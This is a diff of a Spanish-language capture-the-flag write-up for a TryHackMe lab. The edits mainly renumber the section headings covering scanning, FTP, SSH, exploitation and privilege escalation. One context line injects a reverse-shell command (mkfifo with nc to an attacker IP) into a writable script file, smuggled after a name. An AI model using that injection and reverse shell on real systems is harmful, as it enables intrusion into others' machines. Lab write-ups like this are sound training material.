@@ -57,6 +57,8 @@ rtt min/avg/max/mdev = 195.728/195.728/195.728/0.000 ms
 
 ## 2. Enumeración / Escaneo
 
+### 2.1 Nmap
+
 - Escaneo de los 65536 puertos de red con nmap:
   
 ```
@@ -130,7 +132,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 160.00 seconds
 ```
 
-### 2.3 WFUZZ
+### 2.2 WFUZZ
 
 - Procedemos a realizar escaneo de los directorios:
   
@@ -176,7 +178,7 @@ ID           Response   Lines    Word       Chars       Payload
 ![](/assets/images/thm-writeup-break-out-the-cage/cage_auditions.png)
 
 
-### 2.2 FTP
+### 2.3 FTP
 
 - Ingresamos al servidor **ftp**, en el cual encontramos un docuemto llamado **dad_tasks**, el cual procedemos a descargar, como se observa a continuación:
 
@@ -236,7 +238,7 @@ ftp>
 
 - Con el paso anterior podemos responder la siguieten pregunta: ***What is Weston's password?***
 
-### 2.3 SSH 
+### 2.4 SSH 
 
 - Con la contraseña encontrada encontrada en el punto anterior procedemos a conectarnos vía ***SSH***:_
 
@@ -283,7 +285,7 @@ I mean it, honey, the world is being Fed-exed to hell in a hand cart. — The Ro
                                                                                
 ```
 
-## Explotacion
+## 3 Explotacion
 
 - Ejecutamos ***linpeas*** y encontramo los siguientes archivos que pueden ser modificados
 
@@ -313,7 +315,7 @@ weston@national-treasure:/opt/.dads_scripts$
 weston@national-treasure:/opt/.dads_scripts/.files$ echo "Nicolas; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.216 4444 >/tmp/f" > .quotes
 
 
-## Bandera de usuario
+## 4 Bandera de usuario
 
 - Ganamos acceso como usuario Cage y en el archivo ***Super_Duper_Checklist*** encontramos la bandera:
   
@@ -331,7 +333,7 @@ cat Super_Duper_Checklist
 ```
 
 
-## Privesc
+## 5 Escalada de Privelegios
 
 - En los correos encontrados, se encuentra el siguiente texto codificado:
 
@@ -373,6 +375,8 @@ jajajajajaja Ahhh Acéptalo... es simplemente extraño.
 
 Saludos
 ```
+---
+
 - Desde cyberchef, procedemos a descifrarla con ***vigenére*** y con la key ***face*** que se repite de manera insistente en el correo y de está manera obtenemos el password de root:
   
  ![](/assets/images/thm-writeup-break-out-the-cage/cage_root.png)
